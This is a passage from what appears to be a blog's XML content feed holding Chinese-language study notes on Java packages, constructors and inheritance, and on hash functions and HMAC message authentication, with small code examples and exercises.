class-name">Circle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Square s<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Square</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Triangle t<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Triangle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">doShape</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">doShape</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">doShape</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span> <span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h3 id="二、-包"><font color="#FF6347" face="Comic sans MS">二、 包</font><a href="post/Java-Interface-Package5#二、-包"></a></h3><h4 id="2-1-包的说明和作用"><font color="#20B2AA" face="Comic sans MS">2.1  包的说明和作用</font><a href="post/Java-Interface-Package5#2-1-包的说明和作用"></a></h4><p><font face="Comic sans MS"><strong>1. 📒包的说明：</strong><br>•    包是用于组织类的一种方式，可以对类进行分组，一个包中可以包含任意数量的类和接s口,本身是一种命名机制，具体的表现就是一个文件夹<br>•    包是一种松散的类的集合：一般不要求处于同一个包中的类有明确的相互关系，如包含、继承等，但是由于同一个包中的类在默认情况下可以相互访问，所以为了方便编程和管理，通常把需要在一起工作的类放在一个包里。</font></p><p><strong>2. 📒包的作用：</strong><br>（1）包能够让程序员将类组织成单元，通过文件夹或目录来组织文件和应用程序；<br>（2）包减少了名称冲突带来的问题，可以防止同名的类发生冲突；<br>（3）包能够更大面积的保护类、变量和方法，而不是分别对每个类进行保护；<br>（4）包可以用于标示类。<br></p><p>&emsp;<br>&emsp;</p><h4 id="2-2-包的创建"><font color="#20B2AA" face="Comic sans MS">2.2  包的创建</font><a href="post/Java-Interface-Package5#2-2-包的创建"></a></h4><p><font face="Comic sans MS"><strong>1. 📒无名包：</strong><br>&emsp;&emsp;系统为每个没有明确指明所属包的.java文件默认创建的包<br>&emsp; &emsp; <font color="#00B2EE"><strong>无名包中的类无法被引用和复用</strong></font></font></p><p><strong>2. 📒有名包：</strong><br>     （1）说明格式   package 包名；<br>       &emsp;&emsp; package SubClass;<br>       &emsp;&emsp; package MyClass.SubClass;<br>     （2）<font color="red"><strong>说明语句必须放在整个.java文件的第一行</strong></font> </p><p><strong>3. 📒创建包的含义：</strong><br>      &emsp;创建包就是在当前文件夹下创建一个子文件夹，以便存放这个包中包含的所有类的.class文件.</p><p><strong>4.</strong> 📒可以在不同的文件中使用相同的包说明语句，这样就可以将不同文件中的类都包含到相同的程序包中.<br></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> SubClass<span class="token punctuation">;</span>         <span class="token keyword">package</span> MyClass<span class="token punctuation">.</span>SubClass<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">s1</span><span class="token punctuation">{</span>                 <span class="token keyword">class</span> <span class="token class-name">s2</span><span class="token punctuation">{</span>……                        …… <span class="token punctuation">}</span>                         <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="2-3-包的引用"><font color="#20B2AA" face="Comic sans MS">2.3  包的引用</font><a href="post/Java-Interface-Package5#2-3-包的引用"></a></h4><p><font face="Comic sans MS"><strong>1. 📒使用全名引用：</strong><br>&emsp;(1) 同包的类相互引用时：<br>&emsp;&emsp;&emsp;      <font color="red">在使用的属性或方法名前加上类名作为前缀即可.</font><br>&emsp;(2) 不同包中的类相互引用时：<br>&emsp;&emsp;&emsp;      <font color="red">在类名的前面再加上包名——类的全名.</font><br>&emsp;&emsp;&emsp;      例如：Class myDate extends java.util.Date{<br>&emsp;&emsp;&emsp;      java.util.Date d=new java.util.Date();<br>&emsp;&emsp;&emsp;      ……<br>&emsp;&emsp;&emsp;       }</font></p><p><strong>2. 📒使用import：</strong><br>&emsp;&emsp;import可以加载整个包中的文件或包中的某一个文件。import语句的格式为：<br>&emsp;&emsp;&emsp;&emsp;<font color="#00B2EE">import package1[.package2…].(classname|*);</font><br></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span>*<span class="token punctuation">;</span> <span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Date<span class="token punctuation">;</span> <span class="token keyword">import</span> java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span>*<span class="token punctuation">;</span> <span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Date<span class="token punctuation">;</span> <span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Date<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">myDate</span> <span class="token keyword">extends</span> <span class="token class-name">Date</span><span class="token punctuation">{</span>         Date d<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>……<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><font color="red" face="Comic sans MS"><strong>注意：java编译器会为所有程序自动引入包java.lang，因此不必用import语句引入它包含的所有的类，但是若需要使用其他包中的类，必须用import语句引入。</strong></font></p><p>&emsp;<br>&emsp;</p><h4 id="2-4-编译和运行包中的类"><font color="#20B2AA" face="Comic sans MS">2.4  编译和运行包中的类</font><a href="post/Java-Interface-Package5#2-4-编译和运行包中的类"></a></h4><p><font face="Comic sans MS">当程序中用package语句指明一个包，在编译时产生的字节码文件（.class文件）需要放到相应的以包名为名称的文件夹目录下：<br>   （1）手工建立子目录，以包名命名该目录，再将.class文件复制到相应目录下。<br>   （2）在编译时，使用“javac –d”命令<br></font></p><p>&emsp;<br>&emsp;</p><h4 id="2-5-Java包"><font color="#20B2AA" face="Comic sans MS">2.5  Java包</font><a href="post/Java-Interface-Package5#2-5-Java包"></a></h4><p><font face="Comic sans MS">&emsp;&emsp;Java自带了一些包。这些包以“java.”开头，作为java的一个标准部分发布。学习Java，必须学习Java常用包中的类。从第六章开始，主要内容是介绍Java常用包的使用。</font></p><p><a href="https://www.breakyizhan.com/java/4260.html" target="_blank" rel="noopener">包的使用参考。</a><br><a href="https://www.breakyizhan.com/java/4313.html" target="_blank" rel="noopener">输入流的使用参考。</a><br>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hash函数和消息认证</title>
      <link href="/post/Hash-Message-Authentication/"/>
      <url>/post/Hash-Message-Authentication/</url>
      
        <content type="html"><![CDATA[<p>&ensp;<br>&ensp;</p><center><font color="#3CB371" face="Comic sans MS" size="5">Hash函数  & 消息认证</font></center><p>&ensp;<br>&ensp;</p><h3 id="一、-Hash函数结构、MD5、SHA-1"><font color="#FF6347" face="Comic sans MS">一、 Hash函数结构、MD5、SHA-1</font><a href="post/Hash-Message-Authentication#一、-Hash函数结构、MD5、SHA-1"></a></h3><p><a href="https://i.loli.net/2018/12/27/5c24b73ee6580.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/12/27/5c24b73ee6580.png" alt="Hash函数.png"></a></p><p>&ensp;<br>&emsp;</p><h3 id="二、-消息认证"><font color="#FF6347" face="Comic sans MS">二、 消息认证</font><a href="post/Hash-Message-Authentication#二、-消息认证"></a></h3><p><font face="Comic sans MS">&emsp;消息认证是一个过程，用以验证接收消息的真实性（的确是由它所声称的实体发来的）和完整性（未被篡改、插入、删除），同时还用于验证消息的顺序性和时间性（未被重排、重放、延迟等）。</font></p><p><strong>认证分为：</strong>实体认证、消息认证。</p><p>&ensp;</p><h4 id="1-1-消息认证码"><font color="#20B2AA" face="Comic sans MS">1.1  消息认证码</font><a href="post/Hash-Message-Authentication#1-1-消息认证码"></a></h4><p><font face="Comic sans MS"><strong>消息认证码：(MAC，Message Authentication Code)或报文认证码</strong>，是用于提供数据源认证和数据完整性的密码校验值。<br><strong>MAC：</strong>是指消息被一密钥控制的公开函数作用后产生的、用作认证的、固定长度的数值，<strong>也称为密码校验和。</strong><br></font></p><div class="article-img"><p><img src="https://i.loli.net/2018/12/28/5c25a1af1de45.png" alt="D3364.png" data-zoomable><br><img src="https://i.loli.net/2018/12/28/5c25a009059a5.png" alt="58D4.png" data-zoomable><br><img src="https://i.loli.net/2018/12/28/5c259da576af5.png" alt="图片21.png" data-zoomable><br><img src="https://i.loli.net/2018/12/28/5c259e5101bfd.png" alt="图片2.png" data-zoomable></p></div><p>&emsp;<br>&emsp;</p><h4 id="1-2-基于DES和Hash函数的消息认证码"><font color="#20B2AA" face="Comic sans MS">1.2  基于DES和Hash函数的消息认证码</font><a href="post/Hash-Message-Authentication#1-2-基于DES和Hash函数的消息认证码"></a></h4><p><font face="Comic sans MS" color="red"><strong>消息认证码的构造主要有两种：</strong>基于分组密码、基于带密钥的Hash函数-HMAC。</font></p><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"> **1. 基于DES的消息认证码：**将需要认证的消息和密钥K经过16轮迭代后生成该消息认证码。</font></td></tr></table></div></div><div class="article-img"><p><img src="https://i.loli.net/2018/12/28/5c25c7ecb59d9.png" alt="图片3.png" data-zoomable></p></div><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"> **2. 基于Hash函数的消息认证码HMAC：**HMAC生成的过程使用了2次Hash函数。</font></td></tr></table></div></div><div class="article-img"><p><img src="https://i.loli.net/2018/12/28/5c25cbf610d03.png" alt="1R.png" data-zoomable><br><img src="https://i.loli.net/2018/12/28/5c25c8fb7288b.png" alt="图片4.png" data-zoomable></p></div><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">描述：(1) K的左边填充0以产生一个b比特长的K<sup>+</sup> （例如Ki的长为160比特，b=512，则需填充44个零字节0x00）(2) K<sup>+</sup>与ipad 逐比特异或以产生b比特的分组Si (3) 将M附于Si后(4) 将哈希函数H作用于步骤(3)产生的数据流(5) K<sup>+</sup>与opad逐比特异或,以产生b比特长的分组S<sub>0</sub>(6) 将步骤(4)得到的杂凑值链接在S<sub>0</sub>后(7) 将H作用于步骤(6)产生的数据流并输出最终结果HMAC</font></td></tr></table></div></div><hr><hr><p>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hash函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java构造方法、对象创建、继承(4.5-4.6)</title>
      <link href="/post/Java-Inherit-4/"/>
      <url>/post/Java-Inherit-4/</url>
      
        <content type="html"><![CDATA[<p>&ensp;<br>&ensp;</p><center><font color="#3CB371" face="Comic sans MS" size="5">继承</font></center><p>&ensp;<br>&ensp;</p><h3 id="一、-构造方法"><font color="#FF6347" face="Comic sans MS">一、 构造方法</font><a href="post/Java-Inherit-4#一、-构造方法"></a></h3><p><font color="red"><strong>📒定义：</strong></font> 构造方法是一种特殊的、与类同名的方法，专门用于<font color="red">创建对象，完成初始化工作。</font> </p><p>&emsp;</p><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"><font color="red">**📒构造方法的特殊性：**</font> **(1)构造方法的方法名与类名相同。****(2)构造方法没有返回类型，也不能写void。****(3)构造方法的主要作用是完成对类对象的初始化工作。****(4)构造方法一般不能由编程人员显式地直接调用，而是用new来调用。****(5)在创建一个类的新对象的同时，系统会自动调用该类的构造方法为新对象初始化。****(6)在Java中，每个类都至少有一个构造方法，如果没有显示地定义构造方法，Java   会自动提供一个缺省的构造方法。**</font></td></tr></table></div></div><p>&emsp;<br>&emsp;</p><h4 id="1-1-构造方法说明"><font color="#3CB371" face="Comic sans MS">1.1  构造方法说明</font><a href="post/Java-Inherit-4#1-1-构造方法说明"></a></h4><p><font color="red"><strong>📒构造方法说明形式如下：</strong></font><br><font color="red">[构造方法修饰符] 方法名（[形式参数列表]）[throws异常列表] {方法体}</font> </p><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">**📒当构造一个类的实例时，编译器主要完成以下3件事情：**(1) 为对象分配内存空间(堆)；(2) 按缺省值初始化对象中的实例变量的值；(3) 调用对象的构造方法(可以在构造方法中初始化其他的值)；(4) 对象变量都是引用型变量。</font></td></tr></table></div></div><p>&emsp;<br>&emsp;</p><h4 id="1-2-构造方法的重载"><font color="#3CB371" face="Comic sans MS">1.2  构造方法的重载</font><a href="post/Java-Inherit-4#1-2-构造方法的重载"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">(1)  缺省的构造方法：如果没有定义构造方法，则Java自动提供了一个缺省的构造方法，如下：public Person(){}；//对象成员变量的初值按Java规定(2)  带参数的构造方法：按需要将一些指定的参数传递给构造方法  例如：public Person(String n){Name=n;}**📒定义构造方法注意：**&emsp;只要类中显式定义了一个或多个构造方法，而且所有显式定义的构造方法都带参数，那么将失去缺省   构造方法。</font></td></tr></table></div></div><pre class="line-numbers language-java"><code class="language-java"><span class="token function">PersonC</span><span class="token punctuation">(</span>String n <span class="token punctuation">,</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">{</span>   name<span class="token operator">=</span>n<span class="token punctuation">;</span>   age<span class="token operator">=</span>a<span class="token punctuation">;</span>   System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"The Person's name is "</span><span class="token operator">+</span>name<span class="token operator">+</span><span class="token string">",age is "</span><span class="token operator">+</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      PersonC per1<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">PersonC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      PersonC per2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">PersonC</span><span class="token punctuation">(</span><span class="token string">"wang li"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      PersonC per3<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">PersonC</span><span class="token punctuation">(</span><span class="token string">"li ming"</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="1-3-对象的创建"><font color="#3CB371" face="Comic sans MS">1.3  对象的创建</font><a href="post/Java-Inherit-4#1-3-对象的创建"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">**1.3.1 📒对象说明：**对象说明的语法形式为：&emsp;&emsp;&emsp;<font color="red">类名&emsp;对象名；</font>**1.3.2. 📒对象的实例化和初始化:****对象构造的语法形式为：**&emsp;&emsp;&emsp;<font color="red">对象名=new 类构造方法名([实参表]);</font> **由new操作符和相应的构造方法完成：**new以类为模板，开辟空间并执行相应的构造方法，完成对象的实例化和初始化，并返回该对象的一个引用（即该对象所在的内存首地址)</font></td></tr></table></div></div><p>&emsp;<br>&emsp;</p><h4 id="1-4-this的使用"><font color="#3CB371" face="Comic sans MS">1.4  this的使用</font><a href="post/Java-Inherit-4#1-4-this的使用"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">**1.4.1 📒使用this来访问成员变量及方法**在方法及构造方法中，可以使用this来访问对象的属性和方法 .**1.4.2. 📒构造方法中，用this调用另一构造方法：****1.4.3. 📒使用this的注意事项：**(1)通过this不仅可以引用该类中定义的变量和方法，还可以引用该类的父类中定义的成员变量和方法。(2)在所有的非static方法中，都隐含了一个参数this。而static方法中，不能使用this。</font></td></tr></table></div></div><pre class="line-numbers language-java"><code class="language-java"><span class="token number">1.4</span><span class="token punctuation">.</span><span class="token number">1</span> <span class="token function">Person</span><span class="token punctuation">(</span>String n<span class="token punctuation">,</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">{</span>        name<span class="token operator">=</span>n<span class="token punctuation">;</span>        age<span class="token operator">=</span>a<span class="token punctuation">;</span>    <span class="token punctuation">}</span> 等价于如下： <span class="token function">Person</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span><span class="token keyword">int</span> age<span class="token punctuation">)</span>           <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span>             <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token operator">=</span>age<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token number">1.4</span><span class="token punctuation">.</span><span class="token number">2</span>  <span class="token function">Desk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   Color<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>           Length<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>         Width<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>         Height<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>  <span class="token function">Desk</span><span class="token punctuation">(</span>String C<span class="token punctuation">,</span><span class="token keyword">int</span> L<span class="token punctuation">,</span><span class="token keyword">int</span> W<span class="token punctuation">,</span><span class="token keyword">int</span> H<span class="token punctuation">)</span>  <span class="token punctuation">{</span>Color<span class="token operator">=</span>C<span class="token punctuation">;</span>     Length<span class="token operator">=</span>L<span class="token punctuation">;</span>   Width<span class="token operator">=</span>W<span class="token punctuation">;</span>   Height<span class="token operator">=</span>H<span class="token punctuation">;</span><span class="token punctuation">}</span>  <span class="token function">Desk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h3 id="二、-继承"><font color="#FF6347" face="Comic sans MS">二、 继承</font><a href="post/Java-Inherit-4#二、-继承"></a></h3><h4 id="2-1-类继承语法形式"><font color="#3CB371" face="Comic sans MS">2.1  类继承语法形式</font><a href="post/Java-Inherit-4#2-1-类继承语法形式"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS">**2.1.1 📒类继承语法形式如下：**&emsp;&emsp;<font color="red">class&emsp;SubClassName&emsp;extends&emsp;SupperClassName</font>extends：继承关键词SubClassName：新的子类名SupperClassName：继承的父类名，必须有且只能一个（即每个子类有且只能有一个父类）**2.1.2 📒子类的特性:**(1) 子类拥有其父类的所有属性和方法。但父类中说明为private的属性和方法，子类不可直接访问。(2) 子类可以对父类的方法覆盖或重载。</font></td></tr></table></div></div><p>&emsp;<br>&emsp;</p><h4 id="2-2-属性的继承、隐藏和添加"><font color="#3CB371" face="Comic sans MS">2.2  属性的继承、隐藏和添加</font><a href="post/Java-Inherit-4#2-2-属性的继承、隐藏和添加"></a></h4><p><strong>注意：属性叫隐藏，方法叫覆盖</strong><br><font face="Comic sans MS"><strong>2.2.1 📒属性的继承：</strong><br>• 子类可以继承父类的所有属性（只要该属性没有private修饰）<br>• 通过属性的继承，子类不需要把父类属性的定义部分重复定义一遍，这样做的好处是减少程序维护的工作量。<br><font color="red">例如：ColorPoint类自动具有Point类的坐标a,b属性</font></font><br>&emsp;<br><font face="Comic sans MS"><strong>2.2.2 📒属性的隐藏：</strong><br>子类重新定义一个与父类那里继承来的成员变量完全相同的变量，就称作属性的隐藏。</font></p><pre class="line-numbers language-java"><code class="language-java"> <span class="token keyword">class</span> <span class="token class-name">living</span><span class="token punctuation">{</span>   <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">human</span> <span class="token keyword">extends</span> <span class="token class-name">living</span><span class="token punctuation">{</span>   <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将父类的age隐藏</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span> human h1<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">human</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> h1<span class="token punctuation">.</span>age<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><strong>2.2.3 📒属性的添加：</strong></font><br>在定义子类时，加上的新的属性变量，就可以使子类比父类多一些属性</p><p><font color="red">例如：ColorPoint类比父类Point多了一个属性，颜色（color）</font></p><p>&emsp;<br>&emsp;</p><h4 id="2-3-方法的继承、覆盖、重载和添加"><font color="#3CB371" face="Comic sans MS">2.3  方法的继承、覆盖、重载和添加</font><a href="post/Java-Inherit-4#2-3-方法的继承、覆盖、重载和添加"></a></h4><p><font face="Comic sans MS"><strong>2.3.1 📒方法的继承：</strong><br>父类的非私有方法也可以被子类自动继承。例如类A具有method()方法，那它的子类B不定义该方法也同样拥有method()。</font></p><p>&emsp;<br><font face="Comic sans MS"><strong>2.3.2 📒方法的覆盖：</strong></font></p><p><font color="red"><strong>方法的覆盖</strong></font>(方法用覆盖这个词修饰，属性用隐藏这个词来修饰)<br>覆盖：在子类中定义的方法和父类中的方法的首部是一样的，包括方法名、参数列表、返回类型和异常抛出。但方法体的实现改变了。<br><img src="https://i.loli.net/2018/12/26/5c23095dc4ba6.png" alt="1.png"></p><p><font face="Comic sans MS" color="red"><strong>例如:</strong></font></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>……<span class="token keyword">int</span> <span class="token function">method</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>……<span class="token punctuation">}</span>……<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token keyword">extends</span> <span class="token class-name">A</span><span class="token punctuation">{</span>……<span class="token keyword">int</span> <span class="token function">method</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token keyword">throws</span>  <span class="token comment" spellcheck="true">//覆盖父类的方法method(int x, int y)</span>IOException<span class="token punctuation">{</span>……<span class="token punctuation">}</span>……<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS" color="red">覆盖的效果：当一个B类对象调用method方法时它只会使用B类的method版本，而父类A的method版本被覆盖掉了</font><br><font face="Comic sans MS"><strong>在覆盖时要注意以下几点：</strong><br>（1）覆盖的方法的<font color="#00B2EE"><strong>首部</strong></font>必须要和被覆盖的方法的首部完全匹配，才能达到覆盖的效果；<br>（2）覆盖的方法的<font color="#00B2EE"><strong>返回值类型</strong></font>必须和被覆盖的方法的返回值类型一致；<br>（3）覆盖的方法所<font color="#00B2EE"><strong>抛出的异常</strong></font>必须和被覆盖方法的所抛出的异常一致，或者是其子类；<br>（4）被覆盖的方法<font color="#00B2EE"><strong>不能为private</strong></font>，否则在其子类中只是新定义了一个方法，并没有对其进行覆盖</font><br>&emsp;<br><font face="Comic sans MS"><strong>2.3.3 📒方法的重载：</strong><br><font color="red"><strong>含义：方法名相同，但参数列表不同</strong></font><br>通过方法的覆盖，能够修改对象的同名方法的具体实现体，相同的方法在各个子类中实现的版本可以不一样.<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; —&ensp;—实现多个类中多态性的基础之一<br><font color="red"><strong>重载的效果：</strong></font>父类A的method版本不会被覆盖掉，相当于在子类B中有两个method方法，一个来自父类，一个自己加的，它们之间的参数列表不一样.<br><font color="red"><strong>注意：</strong></font><br>（1）在使用重载时只能通过不同的参数表样式。<br>（2）不能通过访问权限、返回类型、抛出的异常进行重载；(但是同一类里面的成员方法可以这样重载)<br>（3）被重载的方法不能为private，否则在其子类中只是新定义了一个方法，并没有对其进行重载。</font></p><p><font color="red"><strong>特别注意：</strong></font>在继承机制中，不允许在子类中降低成员(包括变量和方法)的访问权限（访问权限大小关系是private &lt; 缺省 &lt; protected &lt; public）。即如果一个方法在父类中是protected的，那么在子类中要重载或覆盖该方法时，就不能把该方法改成是缺省或private，否则会出现编译错误。<br>&emsp;<br><font color="green"><em>习题1：分析下列程序输出结果</em> </font></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>          <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">PrintNumber</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span>           <span class="token punctuation">{</span>          System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token operator">++</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token keyword">extends</span> <span class="token class-name">A</span><span class="token punctuation">{</span>          <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">PrintNumber</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span><span class="token keyword">int</span> b<span class="token punctuation">)</span>           <span class="token punctuation">{</span>          System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>             <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>                     B b<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   b<span class="token punctuation">.</span><span class="token function">PrintNumber</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token punctuation">}</span>   <span class="token punctuation">}</span>输出结果：<span class="token number">101</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font color="green"><em>习题2：分析下列程序输出结果</em> </font></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>          <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">PrintNumber</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span>           <span class="token punctuation">{</span>          System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token operator">++</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>            <span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token keyword">extends</span> <span class="token class-name">A</span><span 